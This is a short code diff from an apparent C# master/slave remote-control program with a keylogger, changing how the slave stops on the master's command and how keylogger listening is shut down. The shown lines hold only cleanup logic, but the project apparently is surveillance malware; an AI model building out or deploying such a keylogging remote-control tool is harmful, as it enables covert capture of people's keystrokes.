@@ -124,9 +124,8 @@ namespace Slave.Core
                 }
                 catch (ExitException)
                 {
-                    Cleanup();
-                    // The master asked to stop the connection, break from the connection loop
-                    break;
+                    // The master asked to stop the connection, just exit
+                    StopSlave();
                 }
             }
         }
@@ -200,13 +199,13 @@ namespace Slave.Core
 
 
         /// <summary>
-        /// Close network stream and stop the key listening as well
+        /// Close network stream and stop the keylogger listening as well
         /// </summary>
         void Cleanup()
         {
             try
             {
-                MainWindow.keyLoggerManager.Stop();
+                commandsManager.StopKeyloggerListening();
                 networkManager.Cleanup();
             }
             catch (Exception)
